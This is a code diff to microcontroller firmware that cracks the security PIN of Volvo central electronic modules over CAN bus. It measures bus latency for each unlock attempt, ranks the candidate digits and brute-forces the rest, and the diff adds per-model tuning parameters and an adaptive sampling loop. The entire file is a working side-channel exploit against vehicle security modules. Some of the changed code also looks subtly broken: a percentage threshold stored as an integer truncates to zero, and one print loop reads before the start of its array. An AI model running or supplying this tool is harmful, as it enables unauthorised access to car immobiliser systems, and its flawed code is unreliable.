@@ -8,13 +8,12 @@
  *
  */
 
-/* tunable parameters */
 
-#define CALC_BYTES     3     /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
+
+
 #define CEM_PN_AUTODETECT    /* comment out for P2 CEM-L on the bench w/o DIM */
-//#define  DUMP_BUCKETS                               /* dump all buckets for debugging */
+//#define  DUMP_BUCKETS       /* dump all buckets for debugging */
 
-/* end of tunable parameters */
 
 #include <stdio.h>
 #include <FlexCAN_T4.h>
@@ -57,79 +56,97 @@ typedef enum {
 
 #define PIN_LEN         6       /* a PIN has 6 bytes */
 
-unsigned char  shuffle_orders[4][PIN_LEN] = { { 0, 1, 2, 3, 4, 5 }, { 3, 1, 5, 0, 2, 4 }, {5, 2, 1, 4, 0, 3}, { 2, 4, 5, 0, 3, 1} };
+int cem_clocks_per_us;
+int CALC_BYTES;
+int SAMPLES;
+int PERCENT_DIFF_THRESHOLD;
+int MAX_ROUNDS;
 
+unsigned char  shuffle_orders[5][PIN_LEN] = { { 0, 1, 2, 3, 4, 5 }, { 3, 1, 5, 0, 2, 4 }, {5, 2, 1, 4, 0, 3}, { 2, 4, 5, 0, 3, 1} };
 unsigned char *shuffle_order;
 
+
+         
 struct _cem_params {
   unsigned long part_number;
-  int baud;
-  int shuffle;
+  int baud;       /* CAN Bus baud speed */ 
+  int mhz;        /* MCU frequency */ 
+  int shuffle;    /* shuffle order from list above */ 
+  int calc;       /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
+  int samples;    /* how many hundreds of samples to attempt per pin digit */
+  int threshold;  /* percentage difference between top two pins */
+  int rounds;     /* max number of filter rounds before picking top entry */
+  
+
+/* Format:  CEM partnumber, CAN Bus baud speed, MCU frequency,  shuffle order, Calc Bytes, Samples, threshold percentage, Maxium rounds. */ 
+
 } cem_params[] = {
 // P1
-  { 8690719,  CAN_500KBPS, 0 },
-  { 8690720,  CAN_500KBPS, 0 },
-  { 8690721,  CAN_500KBPS, 0 },
-  { 8690722,  CAN_500KBPS, 0 },
-  { 30765471, CAN_500KBPS, 0 },
-  { 30728906, CAN_500KBPS, 0 },
-  { 30765015, CAN_500KBPS, 0 },
-  { 31254317, CAN_500KBPS, 0 },
-  { 31327215, CAN_500KBPS, 3 },
-  { 31254749, CAN_500KBPS, 3 },
-  { 31254903, CAN_500KBPS, 0 },
-  { 31296881, CAN_500KBPS, 0 },
+  { 8690719,  CAN_500KBPS, 8, 0, 4, 1, 0.1, 3 },
+  { 8690720,  CAN_500KBPS, 8, 0, 4, 1, 0.1, 3 },
+  { 8690721,  CAN_500KBPS, 8, 0, 4, 1, 0.1, 3 },
+  { 8690722,  CAN_500KBPS, 8, 0, 4, 1, 0.1, 3 },
+  { 30765471, CAN_500KBPS, 8, 0, 4, 1, 0.1, 3 },
+  { 30728906, CAN_500KBPS, 8, 0, 4, 1, 0.1, 3 },
+  { 30765015, CAN_500KBPS, 8, 0, 4, 1, 0.1, 3 },
+  { 31254317, CAN_500KBPS, 8, 0, 4, 1, 0.1, 3 },
+  { 31327215, CAN_500KBPS, 8, 3, 4, 1, 0.1, 3 },
+  { 31254749, CAN_500KBPS, 8, 3, 4, 1, 0.1, 3 },
+  { 31254903, CAN_500KBPS, 8, 0, 4, 1, 0.1, 3 },
+  { 31296881, CAN_500KBPS, 8, 0, 4, 1, 0.1, 3 },
 
 // P2 CEM-B (Brick shaped 1999-2004 with K-line)
-  { 8645716, CAN_250KBPS, 0 },
-  { 8645719, CAN_250KBPS, 0 },
-  { 8688434, CAN_250KBPS, 0 },
-  { 8688436, CAN_250KBPS, 0 },
-  { 8688513, CAN_250KBPS, 2 },
-  { 30657629, CAN_250KBPS, 0 },
-  { 9494336, CAN_250KBPS, 0 },
-  { 9494594, CAN_250KBPS, 0 },
-  { 8645171, CAN_250KBPS, 0 },
-  { 9452553, CAN_250KBPS, 0 },
-  { 8645205, CAN_250KBPS, 0 },
-  { 9452596, CAN_250KBPS, 0 },
-  { 8602436, CAN_250KBPS, 0 },
-  { 9469809, CAN_250KBPS, 0 },
-  { 8645200, CAN_250KBPS, 0 },
+  { 8645716, CAN_250KBPS, 4, 0, 4, 1, 0.1, 3 },
+  { 8645719, CAN_250KBPS, 4, 0, 4, 1, 0.1, 3 },
+  { 8688434, CAN_250KBPS, 4, 0, 4, 1, 0.1, 3 },
+  { 8688436, CAN_250KBPS, 4, 0, 4, 1, 0.1, 3 },
+  { 8688513, CAN_250KBPS, 4, 0, 4, 1, 0.1, 3 },
+  { 30657629, CAN_250KBPS, 4, 0, 4, 1, 0.1, 3 },
+  { 9494336, CAN_250KBPS, 4, 0, 4, 1, 0.1, 3 },
+  { 9494594, CAN_250KBPS, 4, 0, 4, 1, 0.1, 3 },
+  { 8645171, CAN_250KBPS, 4, 0, 4, 1, 0.1, 3 },
+  { 9452553, CAN_250KBPS, 4, 0, 4, 1, 0.1, 3 },
+  { 8645205, CAN_250KBPS, 4, 0, 4, 1, 0.1, 3 },
+  { 9452596, CAN_250KBPS, 4, 0, 4, 1, 0.1, 3 },
+  { 8602436, CAN_250KBPS, 4, 0, 4, 1, 0.1, 3 },
+  { 9469809, CAN_250KBPS, 4, 0, 4, 1, 0.1, 3 },
+  { 8645200, CAN_250KBPS, 4, 0, 4, 1, 0.1, 3 },
 
 // P2 CEM-L (L shaped and marked L 2005-2014)
-  { 30682981, CAN_500KBPS, 1 },
-  { 30682982, CAN_500KBPS, 1 },
-  { 30728356, CAN_500KBPS, 1 },
-  { 30728542, CAN_500KBPS, 1 },
-  { 30765149, CAN_500KBPS, 1 },
-  { 30765646, CAN_500KBPS, 1 },
-  { 30786475, CAN_500KBPS, 1 },
-  { 30786889, CAN_500KBPS, 1 },
-  { 31282457, CAN_500KBPS, 1 },
-  { 31314468, CAN_500KBPS, 1 },
-  { 31394158, CAN_500KBPS, 1 },
+  { 30682981, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 30682982, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 30728356, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 30728542, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 30765149, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 30765646, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 30786475, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 30786889, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 31282457, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 31314468, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 31394158, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
 
 // P2 CEM-H (L shaped and marked H 2005 - 2007)
-  { 30786476, CAN_500KBPS, 1 },
-  { 30728539, CAN_500KBPS, 1 },
-  { 30682982, CAN_500KBPS, 1 },
-  { 30728357, CAN_500KBPS, 1 },
-  { 30765148, CAN_500KBPS, 1 },
-  { 30765643, CAN_500KBPS, 1 },
-  { 30786476, CAN_500KBPS, 1 },
-  { 30786890, CAN_500KBPS, 1 },
-  { 30795115, CAN_500KBPS, 1 },
-  { 31282455, CAN_500KBPS, 1 },
-  { 31394157, CAN_500KBPS, 1 },
-  { 30786579, CAN_500KBPS, 1 },
+  { 30786476, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 30728539, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 30682982, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 30728357, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 30765148, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 30765643, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 30786476, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 30786890, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 30795115, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 31282455, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 31394157, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
+  { 30786579, CAN_500KBPS, 30, 1, 4, 7, 0.1, 3 },
 };
+
+
 
 /* measured latencies are stored for each of possible value of a single PIN digit */
 
 typedef struct seq {
   uint8_t  pinValue;    /* value used for the PIN digit */
-  uint32_t latency;     /* measured latency */
+  uint64_t latency;     /* measured latency */
   double std;
 } sequence_t;
 
@@ -181,10 +198,6 @@ void canMsgSend (can_bus_id_t bus, uint32_t id, uint8_t *data, bool verbose)
   }
 }
 
-CAN_message_t can_hs_event_msg;
-CAN_message_t can_ls_event_msg;
-volatile bool can_hs_event_msg_available = false;
-volatile bool can_ls_event_msg_available = false;
 
 /*******************************************************************************
  *
@@ -200,8 +213,7 @@ bool canMsgReceive (can_bus_id_t bus, uint32_t *id, uint8_t *data, int wait, boo
   uint8_t *pData;
   uint32_t canId = 0;
   bool     ret = false;
-  volatile bool &msg_avail = (bus == CAN_HS ? can_hs_event_msg_available : can_ls_event_msg_available);
-  CAN_message_t &msg = (bus == CAN_HS ? can_hs_event_msg : can_ls_event_msg);
+  CAN_message_t msg;
 
   do {
 
@@ -210,12 +222,10 @@ bool canMsgReceive (can_bus_id_t bus, uint32_t *id, uint8_t *data, int wait, boo
     bus == CAN_HS ? can_hs.events() : can_ls.events();
 
     /* check if a message was available and process it */
-
-    if (msg_avail) {
+    if (bus == CAN_HS ? can_hs.read(msg) : can_ls.read(msg)) {
 
       /* process the global buffer set by can_hs.events */
 
-      msg_avail = false;
       canId = msg.id;
       pData = msg.buf;
       ret = true;
@@ -311,7 +321,7 @@ uint32_t profileCemResponse (void)
 
     /* keep a running total of the average latency */
 
-    cem_reply_avg += latency / clockCyclesPerMicrosecond();
+    cem_reply_avg += latency;
   }
 
   /* end time in milliseconds */
@@ -322,18 +332,38 @@ uint32_t profileCemResponse (void)
 
   cem_reply_avg /= 1000;
 
-  cem_reply_min = cem_reply_avg / 2;
-  cem_reply_max = cem_reply_avg + cem_reply_min;
+  cem_reply_avg = cem_reply_avg * cem_clocks_per_us / clockCyclesPerMicrosecond();
+
+  cem_reply_min = 0;
+  cem_reply_max = 2 * cem_reply_avg;
 
   /* number of PINs processed per second */
 
   rate = 1e6 / (end - start);
 
-  printf ("1000 pins in %u ms, %u pins/s, average response: %u us, histogram %u to %u us \n", (end - start), rate, cem_reply_avg, cem_reply_min, cem_reply_max);
+  printf ("1000 pins in %u ms, %u pins/s, average response: %u CEM clocks, histogram %u to %u\n",
+    (end - start), rate,
+    cem_reply_avg,
+    cem_reply_min,
+    cem_reply_max);
+
   return rate;
 }
 
-volatile bool intr;
+volatile uint32_t start;
+volatile uint32_t maxTime;
+
+FASTRUN void can_l_interrupt() {
+  uint32_t currentTSC = TSC;
+  
+  if(digitalReadFast(CAN_L_PIN)) {
+    start = currentTSC;
+  } else {
+    if(TSC-start > maxTime) {
+      maxTime = currentTSC - start;
+    }
+  }
+}
 
 /*******************************************************************************
  *
@@ -342,15 +372,21 @@ volatile bool intr;
  * Returns: true if the CEM was unlocked, false otherwise
  */
 
-bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
+FASTRUN bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
 {
   uint8_t  unlockMsg[CAN_MSG_SIZE] = { CEM_HS_ECU_ID, 0xBE };
   uint8_t  reply[CAN_MSG_SIZE];
   uint8_t *pMsgPin = unlockMsg + 2;
-  uint64_t start, end, limit;
   uint32_t id;
-  uint32_t maxTime = 0;
+  uint32_t limit;
+  
+  maxTime = 0;
+  start = 0; 
 
+  /* default reply is set to indicate a failure */
+
+  memset (reply, 0xff, sizeof(reply));
+  
   /* shuffle the PIN and set it in the request message */
 
   for (int i = 0; i < PIN_LEN; i++)
@@ -358,44 +394,25 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
 
   /* maximum time to collect our samples */
 
-  limit = TSC + 2 * 1000 * clockCyclesPerMicrosecond();
-  intr = false;
+  limit = 2 * 1000 * clockCyclesPerMicrosecond();
 
   /* send the unlock request */
   canMsgSend (CAN_HS, 0xffffe, unlockMsg, verbose);
+ 
+   /* Set TSC to 0 to avoid overflow */
+   TSC = 0;
+   
+   /* Main loop */
+   while(TSC < limit){}
 
-  start = end = TSC;
-  while (!intr && TSC < limit) {
-    /* if the line is high, the CAN bus is either idle or transmitting a bit */
-
-    if (digitalRead(CAN_L_PIN))
-      continue;
-
-    /* the CAN bus isn't idle, it's the start of the next bit */
-
-    end = TSC;
-
-    /* we only need to track the longest time we've seen */
-
-    if (end - start > maxTime)
-      maxTime = end - start;
-    /* start of the next sample */
-
-    start = end;
-  }
-
-  /* default reply is set to indicate a failure */
-
-  memset (reply, 0xff, sizeof(reply));
-
-  /* see if anything came back from the CEM */
-
-  canMsgReceive(CAN_HS, &id, reply, 1000, false);
-
+  
   /* return the maximum time between transmissions that we saw on the CAN bus */
 
   if (latency)
     *latency = maxTime;
+
+  /* see if anything came back from the CEM */
+  canMsgReceive(CAN_HS, &id, reply, 1000, verbose);
 
   /* return PIN used if the caller wants it */
 
@@ -552,198 +569,103 @@ int seq_max_lat(const void *a, const void *b)
  * Returns: N/A
  */
 
-
-void crackPinPosition(uint8_t *pin, uint32_t pos, bool verbose)
+void crackPinPosition(uint8_t *pin, int pos, bool verbose)
 {
-  uint8_t seq[100];
-  int i;
-  int ranges[7]  = { 100, 50, 25,  12,   6,   3,   2 };
-  int samples[7] = { 10,  20, 50, 100, 200, 300, 400 };
-
-  for (i = 0; i < 100; i++) {
-    seq[i] = binToBcd(i);
-  }
-
-  for (i = 0; i < 7; i++) {
-    crack_range(pin, pos, seq, ranges[i], samples[i], verbose);
-  }
-}
-
-void crack_range(uint8_t *pin, int pos, uint8_t *seq, int range, int samples, bool verbose)
-{
-  int len = sizeof(int) * (cem_reply_max - cem_reply_min);
-  uint32_t *histogram = (uint32_t *)malloc(len);
-  uint32_t latency;
-  uint32_t prod;
-  uint32_t sum;
-  double std;
-  int pin1, pin2;
-  int i;
-  int k;
-  int xmin = cem_reply_avg + AVERAGE_DELTA_MIN;
-  int xmax = cem_reply_avg + AVERAGE_DELTA_MAX;
-
+  uint64_t latency[100] = { 0 };
+  uint32_t pin1BCD, pin1, i;
+  uint32_t reply_lat;
+  uint32_t samples;
+  uint32_t sample_multiplier = SAMPLES;
+  
+  
   /* clear collected latencies */
-
   memset (sequence, 0, sizeof(sequence));
 
-  printf("range %d, samples %d\n", range, samples);
-  printf("candidates short list: ");
-  for (i = 0; i < min(50, range); i++)
-    printf("%02x ", seq[i]);
-  if (50 < range)
-    printf(" (+ %d more)\n", range - 50);
-  printf("\n");
-  printf("                   us: ");
-  for (i = xmin; i < xmax; i++)
-    printf("%5d ", i);
-  printf("\n");
+  for (i = 0; i < 100; i++) {
+    sequence[i].pinValue = binToBcd(i);
+    sequence[i].latency  = 0;
+    sequence[i].std  = 0;
+  }
 
-  /* iterate over all possible values for the PIN digit */
+  do {
 
-  for (pin1 = 0; pin1 < range; pin1++) {
+   /* Clear latencies */
+   //memset(latency, 0x00, sizeof(latency));
+   printf("Running sequence with %d samples per pin\n", sample_multiplier*100);
+   /* iterate over all possible values for the PIN digit */
+   for (pin1 = 0; pin1 < 100; pin1++) {
 
-    /* set PIN digit */
+      /* Skip values beyond double our threshold */
+      if(sequence[pin1].std > PERCENT_DIFF_THRESHOLD*3) {
+        continue;
+      }
 
-    pin[pos] = seq[pin1];
-
-    /* print a progress message for each PIN digit we're processing */
-
-    printf ("[ ");
-
-    /* show numerial values for the known digits */
-
-    for (i = 0; i <= pos; i++) {
-      printf ("%02x ", pin[i]);
-    }
-
-    /* placeholder for the unknown digits */
-
-    while (i < PIN_LEN) {
-      printf ("-- ");
-      i++;
-    }
-
-    printf ("]: ");
-
-    /* clear histogram data for the new PIN digit */
-
-    memset (histogram, 0, len);
-
-    /* iterate over all possible values for the adjacent PIN digit */
-
-    for (pin2 = 0; pin2 < 100; pin2++) {
-
+      /* Grab our pinBalue (BSC) */
+      pin1BCD = sequence[pin1].pinValue;
+      
       /* set PIN digit */
+      pin[pos] = pin1BCD;
 
-      pin[pos + 1] = binToBcd (pin2);
+      /* print a progress message for each PIN digit we're processing */
+  
+      printf ("[ ");
+  
+      /* show numerial values for the known digits */
+  
+      for (i = 0; i <= pos; i++) {
+        printf ("%02x ", pin[i]);
+      }
+  
+      /* placeholder for the unknown digits */
+  
+      while (i < PIN_LEN) {
+        printf ("-- ");
+        i++;
+      }
+  
+      printf ("] ");
 
-      /* collect latency measurements the PIN pair */
-
-      for (int j = 0; j < samples; j++) {
-
-        pin[pos + 2] = range < 100 ? random(100, 255) : binToBcd(j % 100);
+      /* Do 100 times the sample multiplier to accumulate latency */
+      for(samples=0; samples < 100*sample_multiplier; samples++) {
 
         /* try and unlock and measure the latency */
-
-        cemUnlock (pin, NULL, &latency, verbose);
-
-        /* calculate the index into the historgram */
-
-        int idx = latency / clockCyclesPerMicrosecond();
-
-        if (idx < cem_reply_min)
-          idx = cem_reply_min;
-
-        if (idx >= cem_reply_max)
-          idx = cem_reply_max - 1;
-
-        idx -= cem_reply_min;
-        /* bump the count for this latency */
-
-        histogram[idx]++;
+        cemUnlock (pin, NULL, &reply_lat, verbose);
+   
+        latency[bcdToBin(pin1BCD)] += reply_lat;
       }
+
+      sequence[pin1].latency  = latency[bcdToBin(pin1BCD)];
+      sequence[pin1].std      = 0;
+
+      printf ("latency % 10u;\n", sequence[pin1].latency);
     }
 
-    /* clear the digits we just used for latency iteration */
-
-    pin[pos + 1] = 0x00;
-    pin[pos + 2] = 0x00;
-
-    /* clear statistical values we're calculating */
-
-    prod = 0;
-    sum  = 0;
-
-    /* loop over the histogram values */
-
-    for (k = xmin; k < xmax; k++)
-      printf ("% 5u ", histogram[k - cem_reply_min]);
-
-    for (k = cem_reply_min; k < cem_reply_max; k++) {
-      int l = k - cem_reply_min;
-      uint32_t h = histogram[l];
-
-      if (h) {
-        prod += h * k;
-        sum  += h;
-      }
+    /* Incremenet the sample multiplier if we need to try again */
+    sample_multiplier++;
+    
+    /* sort result*/
+    qsort (sequence, 100, sizeof(sequence_t), seq_max_lat);
+    
+    /* print the top range/2 latencies and their PIN value */
+    printf("best candidates ordered by latency:\n");
+    for (int i = 0; i < 100; i++) {
+      printf ("%u: %02x lat = %u", i, sequence[i].pinValue, sequence[i].latency);
+      sequence[i].std = 0;
+      if (i)
+        sequence[i].std = (100.0 * (sequence[0].latency - sequence[i].latency)) / sequence[0].latency;
+        printf(", prev: -%3.4f%%, best: -%3.4f%%",
+          (100.0 * (sequence[i - 1].latency - sequence[i].latency)) / sequence[i - 1].latency, sequence[i].std);
+      printf("\n");
     }
-
-    int mean = sum / (xmax - xmin);
-    long x = 0;
-
-    for (k = cem_reply_min; k < cem_reply_max; k++) {
-      int l = k - cem_reply_min;
-      if (histogram[l])
-        x += sq(histogram[l] - mean);
-    }
-    std = sqrt((double)x / (cem_reply_max - cem_reply_min));
-
-    /* weighted average */
-
-    printf (": latency % 10u; std %3.2f\n", prod, std);
-
-    /* store the weighted average count for this PIN value */
-
-    sequence[pin1].pinValue = pin[pos];
-    sequence[pin1].latency  = prod;
-    sequence[pin1].std  = std;
+    printf("...\n");
+    
+  }while( (((100.0 * (sequence[0].latency - sequence[1].latency)) / sequence[0].latency) < PERCENT_DIFF_THRESHOLD) && sample_multiplier <= MAX_ROUNDS );
 
 
-#if defined(DUMP_BUCKETS)
-    printf ("Average latency: %u\n", cem_reply_avg);
 
-    for (k = 0; k < cem_reply_max - cem_reply_min; k++) {
-      if (histogram[k] != 0) {
-        printf ("%4u : %5u\n", k + cem_reply_min, histogram[k]);
-      }
-    }
-#endif
-
-  }
-
-  /* sort the collected sequence of latencies */
-
-  qsort (sequence, range, sizeof(sequence_t), seq_max_lat);
-
-  /* print the top range/2 latencies and their PIN value */
-  printf("best candidates ordered by latency:\n");
-  for (int i = 0; i < range; i++) {
-    printf ("%u: %02x lat = %u\n", i, sequence[i].pinValue, sequence[i].latency);
-  }
-  printf("...\n");
-
-  for (i = 0; i < range; i++)
-    seq[i] = sequence[i].pinValue;
-
-  if (range == 2) {
-    /* set the digit in the overall PIN */
-    pin[pos] = sequence[0].pinValue;
-    printf ("pin[%u] choose candidate: %02x\n", pos, pin[pos]);
-  }
-
-  free(histogram);
+  /* set the digit in the overall PIN */
+  pin[pos] = sequence[0].pinValue;
+  printf ("pin[%u] choose candidate: %02x\n", pos, pin[pos]);
 }
 
 /*******************************************************************************
@@ -893,36 +815,21 @@ void cemCrackPin (int maxBytes, bool verbose)
     /* verify the response came from the CEM and is a successful reply to our request */
 
     if ((can_id == 3) &&
-      (data[0] == CEM_HS_ECU_ID) && (data[1] == 0xB9) && (data[2] == 0x00)) {
+      /* data[2]: 0x00 - unlocked, 0x01 - locked, 0xff - already unlocked */
+      (data[0] == CEM_HS_ECU_ID) && (data[1] == 0xB9) && (data[2] != 0x01)) {
       printf ("PIN verified.\n");
     } else {
-      printf ("PIN verification failed!\n");
+      printf ("PIN verification failed! id 0x%x: 0x%02x 0x%02x 0x%02x\n", can_id, data[0], data[1], data[2]);
     }
   }
 
   printf ("done\n");
 }
 
-void can_hs_event (const CAN_message_t &msg)
-{
-  can_hs_event_msg = msg;
-  can_hs_event_msg_available = true;
-}
-
-void can_ls_event (const CAN_message_t &msg)
-{
-  can_ls_event_msg = msg;
-  can_ls_event_msg_available = true;
-}
-
 void can_ls_init(int baud)
 {
   can_ls.begin();
   can_ls.setBaudRate(baud);
-  can_ls.enableFIFO();
-  can_ls.enableFIFOInterrupt();
-  can_ls.setFIFOFilter(ACCEPT_ALL);
-  can_ls.onReceive(can_ls_event);
   printf ("CAN low-speed init done.\n");
 }
 
@@ -930,23 +837,7 @@ void can_hs_init(int baud)
 {
   can_hs.begin();
   can_hs.setBaudRate(baud);
-  can_hs.enableFIFO();
-  can_hs.enableFIFOInterrupt();
-  can_hs.setFIFOFilter(ACCEPT_ALL);
-  can_hs.onReceive(can_hs_event);
   printf ("CAN high-speed init done.\n");
-}
-
-/*******************************************************************************
- *
- * ext_output1 - called by FlexCAN_T4's receive interrupt handler
- *
- * Returns: N/A
- */
-
-void ext_output1(const CAN_message_t &msg)
-{
-  intr = 1;
 }
 
 void k_line_keep_alive()
@@ -999,6 +890,9 @@ void setup (void)
 
   pinMode (CAN_L_PIN, INPUT_PULLUP);
 
+  /* CANL_L_PIN interrupt handler */
+  attachInterrupt(digitalPinToInterrupt(CAN_L_PIN), can_l_interrupt, CHANGE);
+
   set_arm_clock (180000000);
 
   printf ("CPU Maximum Frequency:   %u\n", F_CPU);
@@ -1008,12 +902,13 @@ void setup (void)
 
   long pn = 0;
 
-#if defined(CEM_PN_AUTODETECT)
-  can_hs.begin();
   k_line_keep_alive();
   delay(1000);
-  can_ls_init(CAN_125KBPS);
   k_line_keep_alive();
+
+#if defined(CEM_PN_AUTODETECT)
+  can_hs.begin();
+  can_ls_init(CAN_125KBPS);
   pn = ecu_read_part_number(CAN_LS, CEM_LS_ECU_ID);
 
   if (!pn) {// might be CEM-L
@@ -1036,8 +931,15 @@ void setup (void)
   }
 
   shuffle_order = shuffle_orders[hs_params.shuffle];
-  printf("CAN HS baud rate: %d\n", hs_params.baud);
-  printf("PIN shuffle order: %d %d %d %d %d %d\n", shuffle_order[0], shuffle_order[1], shuffle_order[2], shuffle_order[3], shuffle_order[4], shuffle_order[5]);
+  cem_clocks_per_us = hs_params.mhz;
+  CALC_BYTES = hs_params.calc; 
+  SAMPLES = hs_params.samples;
+  PERCENT_DIFF_THRESHOLD = hs_params.threshold;
+  MAX_ROUNDS = hs_params.rounds; 
+  
+  printf("CAN HS baud rate:   %d\n", hs_params.baud);
+  printf("PIN shuffle order:  %d %d %d %d %d %d\n", shuffle_order[0], shuffle_order[1], shuffle_order[2], shuffle_order[3], shuffle_order[4], shuffle_order[5]);
+  printf("CEM MHZ:            %d\n", hs_params.mhz);
 
 #if defined(CEM_PN_AUTODETECT)
   if (!hs_inited)
